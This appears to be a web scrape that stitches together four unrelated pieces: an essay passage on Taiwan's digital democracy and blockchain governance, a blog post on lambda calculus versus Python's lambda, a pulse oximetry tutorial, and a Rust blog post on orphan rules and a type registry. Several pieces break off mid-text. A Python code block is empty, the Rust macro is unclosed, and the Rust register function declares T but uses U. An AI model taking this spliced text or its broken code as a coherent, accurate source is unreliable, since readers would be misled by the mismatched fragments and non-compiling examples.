<p>Sustaining these participatory practices is guaranteed broadband internet access, subsidized by the state for over 98% of its citizens. Any family not covered can take their request directly to the country’s digital minister, the mesmerizing hacktivist Audrey Tang, who has publicly committed to ensuring universal access. Furthermore, instead of digital literacy, Taiwanese schools teach digital competency: “When you say literacy, you assume that they are consumers of data. When you say competence, you assume they are producers of data,” <a href="https://www.youtube.com/watch?v=KNhu0YgF5ZU&amp;feature=emb_logo">Tang has said</a>. “Competence is what we want from a population because everybody is co-creating democracy together.” This means citizens are equipped with the necessary skills to quickly prototype new governmental platforms or additional features for existing ones, and they often do. The government in turn provides the necessary resources to continuously analyze and implement those initiatives, a process called “reverse procurement.”</p>



<p>Yet, perhaps the most interesting of the Taiwanese government’s innovations is a fairly low-tech one: developing expertise in producing and strategically sharing memes. Public policy in Taiwan meets citizens where they are, on social media, and uses humor to convey factual information and spread clarity. This has been incredibly successful in keeping the populace calm and collected during the pandemic; more critically, it has prevented significant misinformation from gaining traction, squashing rumors, conspiracy theories and divisive stories. Often, to dispel fake news, all it takes is for government channels to publish humorous viral memes. It’s hard to laugh at something and feel scared at the same time.</p>



<h5><strong>Governance Beyond The Nation-State</strong></h5>



<p>Thinking about democratic innovations necessarily brings an observer outside the strict scope and boundaries of the nation-state. Political movements and phenomena are increasingly transnational, and here borderless blockchain networks offer promising technologies for innovative governance.</p>



<p>Criticisms of online voting abound, with the main vulnerability being that at the end of the day, whoever controls the voting software gets to control results. This leads to a very old question, first formulated by the Roman poet Juvenal in the second century: “Quis custodiet ipsos custodes?”&nbsp;Who watches the watchmen?</p>



<p>Paper voting addresses this issue by requiring that members of the different parties involved in an election are present when votes are counted, so one essentially watches the other. While that may be a stable procedure in most developed nations, vote-counting is often marred by violence and threats in countries without robust legal systems. Providing a better alternative to this physical multiparty verification is precisely the raison d’être of blockchain technology, which specifies a set of incentives for a network of participants to maintain a decentralized and censorship-resistant ledger. Think of a Wikipedia-like structure, properly incentivized to ensure there’s no fraudulent behavior within its network.</p>

<p>It is still too early to begin implementing this technology in elections, with many more advances in cryptography techniques needed to ensure that robust secrecy and anonymity is provided to voters. That said, these networks can already offer a glimpse of what’s possible in terms of digital governance, since in many ways their functioning is analogous to nation-states. Both have a common currency and public goods that require funding and maintenance. The key difference is that “citizens” of blockchain networks are distributed around the globe, and the dominating ethos of those communities is one that favors disintermediation and participation over central planning. In order to achieve that, various solutions are being pioneered. In fact, a kind of political-economy Renaissance is taking place, and rapid experimentation with new institutional frameworks and economic and political designs is occurring at an accelerated pace.</p>



<p>Among the most prominent innovations is “quadratic funding,” a collaboration between Microsoft’s political economist Glen Weyl, Ethereum’s creator Vitalik Buterin and Zoë Hitzig, a poet and economics PhD student at Harvard. Quadratic funding consists of a matching mechanism that helps surface and distribute resources for public goods. Similarly, quadratic voting is a system that helps increase the diversity of decision-makers by empowering smaller groups to make their voices heard with a pricing mechanism that accurately …</p></div></div>

<p>LAMBDA IN Python has been derived from functional programming, however
there is nothing that lambda can do that can’t be done with the usual
<code>def foo(*args, **kwargs): ...</code> syntax. At the advent of Python3 <a href="https://www.artima.com/weblogs/viewpost.jsp?thread=98196" target="_blank">Guido proposed
to remove lambda from Python</a>,
but relented and allowed it to stay.</p>
<p>Haskell is a canonical functional programming language, it relies heavily on
lambda calculus, although it does have a lambda syntax : <code>(\x -&gt; x + 1)</code>, this is equivalent to <code>(+1)</code>. How can this be? Every function is a lambda function.</p>
<p>We’ll take a quick look at lambda calculus using Python. Then I’ll claim <strong>we
don’t use lambda calculus in Python</strong>, despite
all the great advantages it gives Haskell programmers. Finally we’ll look at how we
use <code>lambda</code> in Python and discuss why it should have been changed going into Python3.</p>
<p>I know this will be an aggravating read for many
pythonistas, but please try to remain calm and keep an open mind. <strong>Don’t
comment without reading first!</strong></p>
<section><h2>Lambda Calculus</h2>
<div>
<p>
(\lambda x. \lambda y. x + y)(2)(3)
= (\lambda y. 2 + y)(3)
= 2 + 3
</p>

</div>
<p><a href="https://en.wikipedia.org/wiki/Lambda_calculus" target="_blank">LAMBDA CALCULUS (aka. <span><span>\lambda</span></span>-calculus)</a>
is Turing Complete, meaning <strong>we can make programs from just lambda</strong>. In lambda calculus, the
function <code>lambda x: x</code> would be written as <span><span>\lambda x.x</span></span>.</p>
<p>In Python we have some syntactic sugar, <code>lambda x, y: x + y</code> is actually accepting a tuple
of arguments. In the examples I’m being strict and passing arguments individually as per the
maths syntax <span><span>\lambda x. \lambda y. x + y</span></span>.</p>
<p>To resolve a lambda
expression, we substitute in arguments. I’ve shown it in Python syntax so you can
run the functions.</p>
<div><pre><span></span><span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>(</span><span>lambda</span> <span>y</span><span>:</span> <span>x</span> <span>+</span> <span>y</span><span>))(</span><span>2</span><span>)(</span><span>3</span><span>)</span>
<span>(</span><span>lambda</span> <span>y</span><span>:</span> <span>2</span> <span>+</span> <span>y</span><span>)(</span><span>3</span><span>)</span>
<span>2</span> <span>+</span> <span>3</span>
</pre></div>

<p>You can use this syntax to create all manner of programs because <strong>you can substitute
functions as well as values</strong>.</p>
<p>Here we have a function that accepts another function
and a single argument. It is given a function that adds 1 to a single argument,
and then it is given 4 as an argument.</p>
<div><pre><span></span><span>(</span><span>lambda</span> <span>f</span><span>:</span> <span>(</span><span>lambda</span> <span>a</span><span>:</span> <span>f</span><span>(</span><span>a</span><span>)))(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span> <span>+</span> <span>1</span><span>)(</span><span>4</span><span>)</span>
<span>(</span><span>lambda</span> <span>a</span><span>:</span> <span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span> <span>+</span> <span>1</span><span>)(</span><span>a</span><span>))(</span><span>4</span><span>)</span>
<span>(</span><span>lambda</span> <span>a</span><span>:</span> <span>a</span> <span>+</span> <span>1</span><span>)(</span><span>4</span><span>)</span>
<span>4</span> <span>+</span> <span>1</span>
</pre></div>

<p>As a glimpse into what can be done with lambda calculus, here’s an ‘if-then-else’
branching function where we’ve broken the rules of lambda calculus by naming the
functions to aid readability.</p>
<p>For more about lambda calculus in Python syntax,
I’d recommend a talk from EuroPython 2017 by
<a href="https://www.youtube.com/watch?v=7BsfMMYvGaU" target="_blank">Anjana Vakil, called “Mary had a little lambda”</a>.</p>
<div><pre><span></span><span>TRUE</span> <span>=</span> <span>lambda</span> <span>x</span><span>:</span> <span>lambda</span> <span>y</span><span>:</span> <span>x</span>
<span>FALSE</span> <span>=</span> <span>lambda</span> <span>x</span><span>:</span> <span>lambda</span> <span>y</span><span>:</span> <span>y</span>
<span>IFELSE</span> <span>=</span> <span>lambda</span> <span>p</span><span>:</span> <span>lambda</span> <span>a</span><span>:</span> <span>lambda</span> <span>b</span><span>:</span> <span>p</span><span>(</span><span>a</span><span>)(</span><span>b</span><span>)</span>

</section><section><h2>Lambda Calculus: <strong>+</strong></h2>
<p>LAMBDA, WHEN used in a programming language to define functions gives you
currying and thus partial application built in. If you’ve read
<a href="http://www.paulbrownmagic.com/blog/python_partial_application" target="_blank">Python Partial: Code Your Intention</a>, you’ll
know I’m a big fan of this.</p>
<p>Lambda calculus can provide features we find in Python, which we know and love, such as
first-class functions and higher-order functions, because we can pass functions
around.</p>
<p>It can also be used for lazy evaluation: the substitutions can be undertaken
without executing the functions. This also allows a compiler, such as the
Haskell compiler, to reduce the computation required when composing functions together.</p>
</section><section><h2><strong>No</strong> Lambda in Python</h2>
<p>I LOVE the benefits of lambda calculus, I love Python. The two do not mix. In Python our functions
are not curried or evaluated using lambda calculus, we know this because functions
need all their arguments when called.
Consider the difference between these two addition functions.</p>
<p><code>l_add</code> needs the arguments passed one at a time. We never see this syntax with multiple parenthesis
in Python. It works and it has many benefits built in, but it would be a paradigm
shift to expect pythonistas to start writing their programs this way, it’s just
not Pythonic.</p>
<div><pre><span></span><span>def</span> <span>add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>):</span>
    <span>return</span> <span>a</span> <span>+</span> <span>b</span>

<span>l_add</span> <span>=</span> <span>lambda</span> <span>a</span><span>:</span> <span>lambda</span> <span>b</span> <span>:</span> <span>a</span> <span>+</span> <span>b</span>

<span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span>
<span>l_add</span><span>(</span><span>1</span><span>)(</span><span>2</span><span>)</span>
</pre></div>

<p>Compare this to Haskell, which is built for using lambda calculus. Haskell’s syntax
is less verbose, easier to write, there’s no annoying parenthesis and the
benefits of currying are built in.</p>
<div><pre><span></span><span>-- declaring the function</span>
<span>l_add</span> <span>a</span> <span>b</span> <span>=</span> <span>a</span> <span>+</span> <span>b</span>
<span>-- calling the function</span>
<span>l_add</span> <span>1</span> <span>2</span>

<span>-- partial application</span>
<span>incr</span> <span>=</span> <span>l_add</span> <span>1</span>
<span>-- calling the partial function</span>
<span>incr</span> <span>2</span>
</pre></div>

</section><section><h2><strong>But That’s Not How We Use Lambda In Python</strong></h2>
<p>I KNOW! In Python we call our functions with all their arguments at the same time,  even <code>lambda x, y: x + y</code> is expecting both arguments together. Typical use cases in Python are for very short inline functions, usually when being passed to a higher-order function.</p>
<p>During the debate about removing lambda from Python3,
<a href="https://www.artima.com/forums/flat.jsp?forum=106&amp;thread=98196&amp;start=30&amp;msRange=15" target="_blank">Kay Schluehr proposed an inline syntax</a>,
it should be possible to make use of the use of <code>_</code> with <code>inline</code> to create anonymous
functions that fulfil our requirement, encode our intention, and stay pythonic.</p>
<p>In Python <strong><code>lambda</code> is a short,
inline, anonymous function</strong>. But, <strong>an anonymous function is not a calculus.</strong></p>
<div><pre><span></span><span># Typical use cases</span>
<span>map</span><span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>x</span> <span>+</span> <span>1</span><span>,</span> <span>range</span><span>(</span><span>5</span><span>))</span>
<span>max</span><span>(</span><span>my_tuples</span><span>,</span> <span>key</span><span>=</span><span>lambda</span> <span>t</span><span>:</span> <span>t</span><span>[</span><span>1</span><span>])</span>

<span># More pythonic? Closer to the user intent?</span>
<span>map</span><span>(</span><span>inline</span> <span>_</span><span>(</span><span>x</span><span>):</span> <span>x</span> <span>+</span> <span>1</span><span>,</span> <span>range</span><span>(</span><span>5</span><span>))</span>

</pre></div>

</section><section><h2>Add Sugar</h2>
<p><strong>PYTHON IS capable
of lambda calculus, but it is not considered pythonic to use it.</strong> If a
library like <code>datetime</code> were to use lambda calculus there would be outcry from the community,
no-one would want to call functions with a set of parenthesis for each argument.</p>
<p>But the <strong>normal way to call a function could be made syntactic sugar for
the lambda calculus way</strong>. Just like in Haskell, Python would not <em>need</em>
a <code>lambda</code> syntax. This imaginary case reveals how the <code>lambda</code> syntax is not being
used appropriately. If <code>def foo(x): ...</code> were this syntactic sugar, how would we declare our inline anonymous functions?</p>
<div><pre><span></span><span># Normal python call:</span>

</section><section><h2>Conclusion</h2>
<p>IF EVERY function were a lambda function with some syntactic sugar, we’d still
need a way to declare inline anonymous functions. This brings us back to needing
something like <code>inline _(): ...</code>. This also brings back my argument for all
the functional programming techniques I have covered in this blog so far: <strong>Code
the authors intention</strong>.</p>
<p>In Python, <strong>we do not use <code>lambda</code> with the intention of using lambda calculus</strong>. Our
syntax needs to encode our intention in the places we have used it, and where we will use it.
These use cases are inline, anonymous functions.</p>

<h3>Introduction</h3>
<p>Pulse oximeters measure how much of the hemoglobin in blood is carrying oxygen (oxygen saturation).</p>
<p>If you work in healthcare (or have been patient !) you are very likely to have come across pulse oximeters. You can find them in areas such as operating rooms, recovery, critical care, wards, and ambulances.</p>
<p>Pulse oximeters are in common use because they are:</p>
<ul>
<li>non invasive</li>
<li>cheap to buy and use</li>
<li>can be very compact</li>
<li>detects hypoxaemia earlier than you using your eyes to see cyanosis.</li>
</ul>
<hr>
<h3>Oxygen Saturation</h3>
<p>Pulse oximeters measure oxygen saturation. Before we learn the principles of how pulse oximeters work, we need to have an understanding of what oxygen saturation is.</p>
<p>We all know that we need oxygen for life. ( Some of you may find this section a little too basic. In that case, to skip this short section, click this link to go to next section Physical properties used in pulse oximetry )</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/solo_oxygen.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/solo_oxygen.gif" alt="solo_oxygen" width="800" height="332"></a></p>
<p>Oxygen enters the lungs and then is passed on into blood. The blood carries the oxygen to the various organs in our body. The main way oxygen is carried in our blood is by means of hemoglobin. You can imagine hemoglobin molecules( Hb) as “cars” and the “roads” being our blood vessels. The oxygen molecules get into these cars and travel around the body till they reach their destination.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/cars_wikipedia.jpg"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/cars_wikipedia.jpg" alt="cars_wikipedia" width="800" height="431" srcset="https://www.howequipmentworks.com/wp-content/uploads/2015/01/cars_wikipedia-300x162.jpg 300w, https://www.howequipmentworks.com/wp-content/uploads/2015/01/cars_wikipedia.jpg 800w" sizes="(max-width: 800px) 100vw, 800px"></a></p>
<p>Let us consider these ” hemoglobin cars”.</p>
<p>The hemoglobin without oxygen we will call de oxygenated hemoglobin (deoxy Hb). The hemoglobin with oxygen, we will call oxygenated hemoglobin (oxy Hb).</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_car.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_car.gif" alt="oxy_car" width="800" height="332"></a></p>
<p>Oxygen saturation simply refers to the percentage of the available hemoglobin that carries oxygen. Take the situations below. There are 16 hemoglobin units and none of the 16 have oxygen. The oxygen saturation is therefore 0 %.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/zero_car.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/zero_car.gif" alt="zero_car" width="800" height="332"></a></p>
<p>Here, 8 of the 16 Hb have oxygen. The oxygen saturation is therefore 50 %.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/fifty_car.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/fifty_car.gif" alt="fifty_car" width="800" height="332"></a></p>
<p>Similarly for 75 % …</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/seventy_five_car.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/seventy_five_car.gif" alt="seventy_five_car" width="800" height="332"></a></p>
<p>And of course , when all the Hb have oxygen, the saturation is 100 %</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/hundred_car.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/hundred_car.gif" alt="hundred_car" width="800" height="332"></a></p>
<p>So in summary, oxygen saturation tells you the percentage of the total hemoglobin that is carrying oxygen.</p>
<hr>
<h3>Physical properties used in pulse oximetry</h3>
<p>Pulse oximetry uses light to work out oxygen saturation. Light is emitted from light sources which goes across the pulse oximeter probe and reaches the light detector.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/red_intro.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/red_intro.gif" alt="red_intro" width="800" height="332"></a></p>
<p>If a finger is placed in between the light source and the light detector, the light will now have to pass through the finger to reach the detector. Part of the light will be absorbed by the finger and the part not absorbed reaches the light detector.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/red_finger_intro.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/red_finger_intro.gif" alt="red_finger_intro" width="800" height="332"></a></p>
<p>The amount of light that is absorbed by the finger depends on many physical properties and these properties are used by the pulse oximeter to calculate the oxygen saturation.</p>
<p>The amount of light absorbed depends on the following:</p>
<p>1. concentration of the light absorbing substance.</p>
<p>2. length of the light path in the absorbing substance</p>
<p>3. oxyhemoglobin and deoxyhemoglobin absorbs red and infrared light differently</p>
<p>Don’t worry ! All the above will be explained in the next sections:</p>
<p>The physical properties that a pulse oximeter employs will be explained using the probe shown below. A finger is shown inserted into the probe. Above the finger are the light sources that emit light. In the finger is an artery which carries the blood the pulse oximeter is interested in and a vein through which the blood leaves the finger. Below the finger is the light detector.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/av_intro.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/av_intro.gif" alt="av_intro" width="800" height="332"></a></p>
<hr>
<h4>Physical property No.1 : Amount of light absorbed is proportional to the concentration of the light absorbing substance</h4>
<p>Hemoglobin (Hb) absorbs light. The amount of light absorbed is proportional to the concentration of Hb in the blood vessel. In the diagram below, the blood vessels in both fingers have the same diameter. However, one blood vessel has a low Hb concentration ( i.e. low number of Hb in each unit volume of blood) and the other blood vessel has a high Hb concentration ( i.e. high number of Hb in each unit volume of blood). Each single Hb absorbs some of the light, so more the Hb per unit area, more is the light is absorbed. This property is described in a law in physics called “Beer’s Law”.</p>
<p>Beer’s Law: Amount of light absorbed is proportional to the concentration of the light absorbing substance</p>
<p>By measuring how much light reaches the light detector, the pulse oximeter knows how much light has been absorbed. More the Hb in the finger , more is the light absorbed.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/conc_absorb.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/conc_absorb.gif" alt="conc_absorb" width="800" height="437"></a></p>
<h4>Physical property No.2 : Amount of light absorbed is proportional to the length of the light path.</h4>
<p>Look at the two fingers shown below. Both arteries have the same concentration (same Hb per unit area, blue square) However, the artery on right is wider than the one on the left.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/square_frames.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/square_frames.gif" alt="square_frames" width="800" height="437"></a></p>
<p>The light emitted from the source has to travel through the artery. The light travels in a shorter path in the narrow artery and travels through a longer path in the wider artery ( paths are shown as green lines below). Though the concentration of Hb is the same in both arteries, the light meets more Hb in the wider artery, since it travels in a longer path. Therefore, longer the path the light has to travel, more is the light absorbed. This property is described in a law in physics called “Lambert’s Law”.</p>
<p>Lambert’s Law: Amount of light absorbed is proportional to the length of the path that the light has to travel in the absorbing substance.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/light_path.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/light_path.gif" alt="light_path" width="800" height="437"></a></p>
<h4>Physical property No.3 : oxyhemoglobin absorbs more infrared light than red light &amp; deoxyhemoglobin absorbs more red light than infrared light (this is explained below !)</h4>
<p>We have seen how concentration and light path affect the absorbance of light. In addition to these, the pulse oximeter makes use of another important property to calculate oxygen saturation. That is, oxy hemoglobin and deoxy hemoglobin absorb light of different wavelengths in a specific way.</p>
<p>Before we go further, we need to remember what wavelength is. All light is composed of waves. The distance between the “tips” of the waves is equal to the wavelength.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/wavelength.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/wavelength.gif" alt="wavelength" width="800" height="332"></a></p>
<p>Light wavelengths are very short, and the unit of measurement is nanometer (nm) ( 1 meter = 1,000,000,000 nanometers !). For an example, the wave on the left has a wavelength of 650 nm and the wave on the right has a longer wavelength of 950 nm.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/wavelength_number.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/wavelength_number.gif" alt="wavelength_number" width="800" height="332"></a></p>
<p>Different “colors” of light have their own wavelength.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/wave_show.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/wave_show.gif" alt="wave_show" width="800" height="437"></a></p>
<p>The pulse oximeter uses the property that oxyhemoglobin and deoxyhemoglobin absorb light of different wavelengths in a specific way. This property can be demonstrated in a laboratory as will be now described. We can first demonstrate how oxyhemoglobin absorbs light of different wavelengths in a specific way. We use a special light source of which we can adjust the wavelength of the light it emits. This light source sequentially passes light of different wavelengths through a sample of oxy Hb. The detector notes how much light, at each wavelength, has been absorbed.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/red_multiwavelength.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/red_multiwavelength.gif" alt="red_multiwavelength" width="246" height="403"></a></p>
<hr>
<p>A graph for the absorbance of oxy hemoglobin at different wavelengths will look like this. It shows that oxy Hb doesn’t absorb the same amount of light at different wavelengths.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_curve.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_curve.gif" alt="oxy_curve" width="800" height="437"></a></p>
<p>We can repeat the same demonstration using deoxy Hb.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/blue_multiwavelength.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/blue_multiwavelength.gif" alt="blue_multiwavelength" width="246" height="403"></a></p>
<hr>
<p>Again notice , how like oxy Hb, Deoxy Hb absorbs different amount of light at different wavelengths.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/deoxy_curve.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/deoxy_curve.gif" alt="deoxy_curve" width="800" height="437"></a></p>
<p>Now let us see the absorbance graph of oxy Hb and the absorbance graph of deoxy Hb together so you can compare them. Note how each of them absorbs light of different wavelengths very differently.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/combined_curve.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/combined_curve.gif" alt="combined_curve" width="800" height="437"></a></p>
<p>The pulse oximeter uses two lights to analyze hemoglobin.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/r_ir_finger.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/r_ir_finger.gif" alt="r_ir_finger" width="800" height="437"></a></p>
<p>One is a red light, which has a wavelength of approximately 650 nm. The other is an infrared light, which has a wavelength of 950 nm. (Throughout our description, we will show the infrared light in light blue. In reality, infrared light is invisible to the human eye.)</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/labelled_led.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/labelled_led.gif" alt="labelled_led" width="800" height="332"></a></p>
<p>Now look at the oxy Hb absorbance graph again, but this time paying attention to the wavelengths of light used in pulse oximeters. You will see that oxy Hb absorbs more infrared light than red light.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_absorb.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_absorb.gif" alt="oxy_absorb" width="800" height="437"></a></p>
<p>Below is the graph that shows the absorbance of deoxy Hb. It is seen from the graph that deoxy Hb absorbs more Red light than Infrared light.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/deoxy_aborb.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/deoxy_aborb.gif" alt="deoxy_aborb" width="800" height="437"></a></p>
<p>To make the comparison of absorbance of oxy Hb and deoxy Hb easier, here is a composite graph showing the absorbance of both. You will see that :</p>
<p>Oxy Hb absorbs more infrared light than red light</p>
<p>Deoxy Hb absorbs more red light than infrared light</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/combined_absorb.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/combined_absorb.gif" alt="combined_absorb" width="800" height="437"></a></p>
<p>You might find the memory aide below useful to remember the wavelengths absorbed by oxy Hb and deoxy Hb.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/absorb_memory.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/absorb_memory.gif" alt="absorb_memory" width="800" height="437"></a></p>
<p>The pulse oximeter works out the oxygen saturation by comparing how much red light and infra red light is absorbed by the blood. Depending on the amounts of oxy Hb and deoxy Hb present, the ratio of the amount of red light absorbed compared to the amount of infrared light absorbed changes.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_ratio.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/oxy_ratio.gif" alt="oxy_ratio" width="800" height="437"></a></p>
<p>Using this ratio, the pulse oximeter can then work out the oxygen saturation.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/ratio_computer.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/ratio_computer.gif" alt="ratio_computer" width="800" height="332"></a></p>
<p>For an example, at 100 % saturation, the absorbance ratio ( i.e. comparing how much red light and infrared light is absorbed) will be same as that seen with the oxy Hb absorbance curve that we saw earlier.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/hundred_ratio.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/hundred_ratio.gif" alt="hundred_ratio" width="800" height="437"></a></p>
<p>At 0 % saturation, there is only deoxy Hb. The absorbance ratio ( i.e. comparing how much red light and infrared light is absorbed) will therefore be same as that seen with the de oxy Hb absorbance curve that we saw earlier.</p>
<p><a href="https://www.howequipmentworks.com/wp-content/uploads/2015/01/zero_ratio.gif"><img src="https://www.howequipmentworks.com/wp-content/uploads/2015/01/zero_ratio.gif" alt="zero_ratio" width="800" height="437"></a></p>
<p>Now look at when the patient has an oxygen saturation of 75 %. The blood has both , oxy Hb and deoxy Hb. The absorbance pattern is now somewhere in between the oxy Hb curve and deoxy Hb …</p></div></div></section></div></main></div></div></div>

            <section>
                <div>
                    <p>Recently at work I managed to hit the Orphan Rules implementing some things for an internal crate. Orphan Rules you say? These are ancient rules passed down from the <a href="http://smallcultfollowing.com/babysteps/blog/2015/01/14/little-orphan-impls">before times (pre 1.0)</a> that have to do with trait coherence. Mainly, if you and I both implement a trait from another crate on the same type in another crate and we compile the code, which implementation do we use? Coherence is about knowing exactly which implementation of the code we use. Unfortunately this can be a bit strict at times and was the issue I ran into that I want to talk about how it was solved.</p><figure><img src="https://blog.mgattozzi.dev/content/images/2020/07/EQnJasjUUAAblGi.jpg.jpg" alt="Oliver Twist holding up a bowl asking for more"><figcaption>Please sir can I have a foreign impl on a foreign type?</figcaption></figure><p>I'm going to be intentionally vague here, but bear with me as the thing I want to talk about is the actual solution that you might need dear reader. My work code base is a chonky one, around 330,000 lines of actual code (which is all pre-macro) according to tokei. We absolutely have to break this up into multiple crates. There's just no other way to cache this effectively (fun times for CI) and separate logical concerns. This means we use types in the main application that come from these more foundational crates.</p><p>In this specific instance we have a crate that acts like a store of different types. It's a <code>HashMap&lt;&amp;'static str, HashMap&lt;String, Box&lt;dyn Any + Send + Sync&gt;&gt;</code> wrapped in a type that has methods to access it. A more redacted slimmed down version is this:</p><pre><code>pub struct Store {
  // The first key is the "Type" of the object, while the second key is
  // it's "Name". We can have multiple of the same "Type"
  inner: HashMap&lt;&amp;'static str, HashMap&lt;String, Box&lt;dyn Any + Send + Sync&gt;&gt;
}

impl Store {
  pub fn get&lt;T&gt;(name: &amp;str) -&gt; Option&lt;&amp;T&gt;
    where T: Storeable
  {
    //.....
  }
  
  // Some other similar methods for retrieval
}</code></pre><p>The key here is this <code>Storeable</code> trait that is pretty important it looks like:</p><pre><code>pub trait Storeable {
  const TYPE: &amp;'static str;
  fn cast(val: Value) -&gt; Result&lt;Box&lt;(dyn Any + Send + Sync)&gt;, Error&gt; {
    let val = Self::try_from(val)?;
    Ok(Box::new(val))
  }
}</code></pre><p>We essentially take some unformed blob of data and cast it and put it in the store when we create it. How the <code>try_from</code> is implemented is not important, just the fact that we cast the value to some Rust type. This is part of a whole crate to just take things in and turn them into this <code>Store</code> that we can pull different Rust types out of. As such we needed a way to pass data from the main application across crate boundaries so we could know what data needed to be casted from and to what types. This leads us to the <code>Registry</code>:</p><pre><code>type RegMap =
  HashMap&lt;&amp;'static str, Box&lt;dyn Fn(Value) -&gt; Result&lt;Box&lt;(dyn Any + Send + Sync)&gt;, Error&gt;&gt;&gt;;

pub struct Registry {
  reg: RegMap
}

impl Registry {
  pub fn new() -&gt; Self {
    Self {
      reg: HashMap::new(),
    }
  }

  pub fn register&lt;T&gt;(&amp;mut self)
  where
    T: Storeable,
    Error: std::convert::From&lt;&lt;U as TryFrom&lt;Value&gt;&gt;::Error&gt;,
  {
    self.reg.entry(U::TYPE).or_insert(
      Box::new(U::cast) as Box&lt;dyn Fn(Value) -&gt; Result&lt;Box&lt;(dyn Any + Send + Sync)&gt;, Error&gt;&gt;
    );
  }
  // The actual code that takes in values and runs it's casting functions on 
  // them that have been registered
}</code></pre><p>Every thing you want to be converted needs to be registered! Now we used to error if we had extra blobs of stuff and this signalled you needed to register things, which was fine when everything was in one repo, but we split it out. So you might run old code with brand new blobs causing it to fail since they weren't tied together. We had to relax this error, but this means if someone fails to register their type in the main application then we might not find out for a while since all they'll get is a <code>None</code> from the <code>Store</code>s <code>get</code> function. This meant we wanted to switch it to a compile time error instead! The solution? More trait bounds!</p><pre><code>// We created a trait in the crate
pub trait Registered {}

// We then created a little macro as the only way to register something
// hiding the documentation around the `register` function for the registry

macro_rules! register {
  ($reg:ident, $type:ty) =&gt; {
    impl cratename::Registered for $type {}
    $reg.register::&lt;$type&gt;();
  }
